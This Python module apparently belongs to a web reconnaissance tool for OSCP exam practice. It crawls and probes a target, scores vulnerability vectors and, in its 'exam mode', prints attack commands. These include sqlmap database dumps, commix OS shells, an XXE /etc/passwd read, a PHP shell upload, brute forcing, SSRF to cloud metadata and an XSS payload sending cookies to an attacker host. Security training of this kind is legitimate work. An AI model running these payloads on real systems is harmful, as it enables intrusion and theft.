from __future__ import annotations

import argparse
import sys
from urllib.parse import urlparse

import requests

from .constants import VERSION, VECTORS
from .crawler import crawl
from .fingerprint import fingerprint_page
from .scorer import score_vectors
from .techstack import detect_stack, stack_boosts
from .prober import probe_page
from .jsextract import scan_js
from .pathscan import scan_paths
from .models import PageResult, VectorScore, EndpointSignal
from .reports import build_report, save_json


def _c(text: str, code: str, colors: bool) -> str:
    return f"\033[{code}m{text}\033[0m" if colors else text


def _input(prompt: str) -> str:
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        return ""


def _hr(colors: bool) -> None:
    print(_c("  " + "─" * 62, "90", colors))


# ── Attack command generators ─────────────────────────────────────────────────

def _attack_commands(scores: list[VectorScore], target: str, stack: dict) -> list[tuple[str, str]]:
    """Return list of (vector, command) for top confirmed/high signals."""
    cmds = []
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"

    for vs in scores:
        if vs.score < 3:
            continue
        # Find most relevant URL for this vector
        sig_url = target
        param = ""
        for s in vs.signals:
            if s.source in ("probe", "param", "form") and s.url != target:
                sig_url = s.url
            if "param '" in s.detail:
                import re
                m = re.search(r"param '(\w+)'", s.detail)
                if m:
                    param = m.group(1)

        v = vs.vector
        if v == "LFI":
            t = sig_url if sig_url != target else target
            cmds.append(("LFI", f"lfireconv5 -t \"{t}\" --wizard"))
        elif v == "SQLI":
            p_flag = f" -p {param}" if param else ""
            cmds.append(("SQLi", f"sqlmap -u \"{sig_url}\"{p_flag} --dbs --batch"))
        elif v == "CMDI":
            p_flag = f" -p {param}" if param else ""
            cmds.append(("CMDI", f"commix -u \"{sig_url}\"{p_flag} --os-shell\n"
                                  f"  # one-shot: commix -u \"{sig_url}\"{p_flag} --os-cmd=id"))
        elif v == "XXE":
            cmds.append(("XXE", f"# Send XML with <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to {sig_url}"))
        elif v == "UPLOAD":
            cmds.append(("UPLOAD", f"# Upload shell.php — try: Content-Type: image/jpeg + .php ext to {sig_url}"))
        elif v == "IDOR":
            cmds.append(("IDOR", f"# Change numeric ID in: {sig_url} — try /1 /2 /0 /9999"))
        elif v == "XSS":
            cmds.append(("XSS", f"# Inject: <script>document.location='http://LHOST/?c='+document.cookie</script>"))
        elif v == "BRAUTH":
            cmds.append(("BRAUTH", f"# Try: admin:admin admin:password on {base}/login\n"
                                    f"  # Burp Intruder + rockyou on login form"))
        elif v == "VERB":
            cmds.append(("VERB", f"curl -X PUT {sig_url} -d 'test'\n"
                                  f"  curl -X DELETE {sig_url}"))
        elif v == "SSRF":
            cmds.append(("SSRF", f"# Inject: http://127.0.0.1/ or http://169.254.169.254/ in URL param"))
        elif v == "SSTI":
            engine = "Jinja2" if "Python" in stack.get("lang","") else "generic"
            cmds.append(("SSTI", f"# {engine} probe: {{{{7*7}}}} then {{{{config}}}} in param"))

    return cmds


# ── Scan runner ───────────────────────────────────────────────────────────────

def run_scan(
    args: argparse.Namespace,
    session: requests.Session,
    mode: str,       # "quick" | "active" | "full"
    colors: bool,
    quiet: bool = False,
) -> tuple[list[PageResult], list[VectorScore], dict[str, str]]:

    def _print(*a, **kw):
        if not quiet:
            print(*a, **kw)

    _print(_c(f"\n  [*] crawling {args.target} (max {args.max_pages} pages) ...", "96", colors))
    pages = crawl(
        start_url=args.target,
        session=session,
        timeout=args.timeout,
        max_bytes=args.max_bytes,
        max_pages=args.max_pages,
        delay=args.delay,
        verbose=getattr(args, "verbose", False),
    )
    _print(_c(f"  [*] {len(pages)} page(s) crawled", "96", colors))

    for page in pages:
        fingerprint_page(page)

    stack = detect_stack(pages)
    if stack and not quiet:
        stack_str = "  ".join(f"{k}:{v}" for k, v in stack.items())
        _print(_c(f"  [*] stack: {stack_str}", "93", colors))

    boosts = stack_boosts(stack)

    extra_signals: list[EndpointSignal] = []

    if mode in ("active", "full"):
        _print(_c("  [*] running active probes ...", "96", colors))
        for page in pages:
            if page.params:
                extra_signals.extend(
                    probe_page(page, session, args.timeout, args.max_bytes, args.delay)
                )

    if mode == "full":
        _print(_c("  [*] scanning JS endpoints ...", "96", colors))
        extra_signals.extend(
            scan_js(pages, session, args.target, args.timeout, getattr(args, "verbose", False))
        )
        _print(_c("  [*] probing common paths ...", "96", colors))
        extra_signals.extend(
            scan_paths(args.target, session, args.timeout, args.delay, getattr(args, "verbose", False))
        )

    # Attach extra signals to a synthetic page for scoring
    if extra_signals:
        from .models import PageResult as _PR
        synth = _PR(
            url=args.target, status=0, content_type="", headers={},
            forms=[], params=[], links=[], signals=extra_signals,
        )
        pages.append(synth)

    scores = score_vectors(pages)

    # Apply tech stack boosts
    for vs in scores:
        if vs.vector in boosts:
            vs.score += boosts[vs.vector]

    scores.sort(key=lambda x: x.score, reverse=True)

    return pages, scores, stack


# ── Display helpers ───────────────────────────────────────────────────────────

def _print_results(scores: list[VectorScore], stack: dict, colors: bool, show_signals: bool) -> None:
    from .display import print_vector_scores
    if stack:
        stack_str = "  ".join(f"{k}:{_c(v,'1;93',colors)}" for k, v in stack.items())
        print(f"  stack detected: {stack_str}\n")
    print_vector_scores(scores, colors, show_signals)


def _print_exam_mode(scores: list[VectorScore], target: str, stack: dict, colors: bool) -> None:
    _hr(colors)
    print(_c("  EXAM MODE — top vectors + attack commands", "1;91", colors))
    _hr(colors)
    print()

    top = [vs for vs in scores if vs.score >= 3][:5]
    if not top:
        print("  no significant signals found\n")
        return

    conf_color = {"HIGH": "1;92", "MEDIUM": "1;93", "LOW": "90"}
    for rank, vs in enumerate(top, 1):
        meta = VECTORS.get(vs.vector, {"name": vs.vector, "note": ""})
        cc = conf_color.get(vs.confidence, "0")
        print(f"  [{rank}] {_c(vs.confidence, cc, colors)} {_c(meta['name'], '1', colors)}")

    print()
    _hr(colors)
    print(_c("  NEXT STEPS", "1;96", colors))
    _hr(colors)
    print()

    cmds = _attack_commands(top, target, stack)
    for i, (label, cmd) in enumerate(cmds, 1):
        print(f"  [{i}] {_c(label, '1;93', colors)}")
        for line in cmd.split("\n"):
            print(f"      {_c(line.strip(), '96', colors)}")
        print()


# ── Wizard ────────────────────────────────────────────────────────────────────

class WizardState:
    def __init__(self, target: str):
        self.target = target
        self.cookie: str = ""
        self.proxy: str = ""
        self.max_pages: int = 30
        self.last_scores: list[VectorScore] = []
        self.last_stack: dict[str, str] = {}
        self.last_pages: list[PageResult] = []


def _print_menu(state: WizardState, colors: bool) -> None:
    print()
    print(_c("  ╔══════════════════════════════════════════════════════════╗", "96", colors))
    print(_c("  ║  WebRecon — OSCP Vector Classifier                       ║", "96", colors))
    print(_c("  ╠══════════════════════════════════════════════════════════╣", "96", colors))
    print(_c("  ║  [1]  Quick Scan    passive crawl + fingerprint           ║", "0", colors))
    print(_c("  ║  [2]  Active Scan   + light probes to confirm vectors     ║", "0", colors))
    print(_c("  ║  [3]  Full Scan     + JS extraction + path discovery      ║", "0", colors))
    print(_c("  ║  [E]  Exam Mode     top vectors + direct attack commands  ║", "1;91", colors))
    print(_c("  ║  [S]  Settings                                            ║", "0", colors))
    print(_c("  ║  [Q]  Quit                                                ║", "0", colors))
    print(_c("  ╚══════════════════════════════════════════════════════════╝", "96", colors))

    status_parts = [f"target:{_c(state.target,'93',colors)}"]
    if state.cookie:
        status_parts.append(f"cookie:{_c('set','92',colors)}")
    if state.proxy:
        status_parts.append(f"proxy:{_c(state.proxy,'93',colors)}")
    status_parts.append(f"pages:{state.max_pages}")
    print("  " + "   ".join(status_parts))
    print()


def _settings_menu(state: WizardState, colors: bool) -> None:
    print()
    _hr(colors)
    print(_c("  SETTINGS", "96", colors))
    _hr(colors)
    print(f"  [T] Target URL    : {state.target}")
    print(f"  [C] Cookie        : {state.cookie or '(not set)'}")
    print(f"  [P] Proxy         : {state.proxy or '(not set)'}")
    print(f"  [M] Max pages     : {state.max_pages}")
    print(f"  [B] Back")
    print()

    choice = _input("  > ").lower()
    if choice == "t":
        v = _input("  target URL: ")
        if v:
            state.target = v
    elif choice == "c":
        state.cookie = _input("  cookie (e.g. PHPSESSID=abc123): ")
    elif choice == "p":
        state.proxy = _input("  proxy (e.g. http://127.0.0.1:8080): ")
    elif choice == "m":
        v = _input("  max pages: ")
        if v.isdigit():
            state.max_pages = int(v)


def _make_args(state: WizardState, base_args: argparse.Namespace) -> argparse.Namespace:
    import copy
    a = copy.copy(base_args)
    a.target = state.target
    a.cookie = state.cookie or None
    a.proxy = state.proxy or None
    a.max_pages = state.max_pages
    return a


def run_wizard(base_args: argparse.Namespace, colors: bool) -> None:
    state = WizardState(target=base_args.target)
    if base_args.cookie:
        state.cookie = base_args.cookie
    if base_args.proxy:
        state.proxy = base_args.proxy

    while True:
        _print_menu(state, colors)
        choice = _input("  > ").lower()

        if choice == "q":
            break

        elif choice == "s":
            _settings_menu(state, colors)

        elif choice in ("1", "2", "3"):
            mode = {"1": "quick", "2": "active", "3": "full"}[choice]
            from .crawler import crawl as _crawl
            from .cli import build_session
            args = _make_args(state, base_args)
            session = build_session(args)

            pages, scores, stack = run_scan(args, session, mode, colors)
            state.last_scores = scores
            state.last_stack = stack
            state.last_pages = pages

            _print_results(scores, stack, colors, show_signals=True)

            # Post-scan sub-menu
            while True:
                print(_c("  [E] exam mode    [D] detail signals    [J] save JSON    [R] re-scan    [M] menu", "90", colors))
                sub = _input("  > ").lower()
                if sub == "e":
                    _print_exam_mode(scores, state.target, stack, colors)
                elif sub == "d":
                    from .display import print_vector_scores
                    print_vector_scores(scores, colors, show_signals=True)
                elif sub == "j":
                    path = _input("  output file [webrecon.json]: ").strip() or "webrecon.json"
                    report = build_report(state.target, pages, scores, stack)
                    save_json(report, path)
                    print(_c(f"  [+] saved {path}", "92", colors))
                elif sub == "r":
                    break
                elif sub == "m" or sub == "":
                    break

        elif choice == "e":
            if not state.last_scores:
                print(_c("  [!] run a scan first", "91", colors))
            else:
                _print_exam_mode(state.last_scores, state.target, state.last_stack, colors)
                _input("  press Enter to continue...")
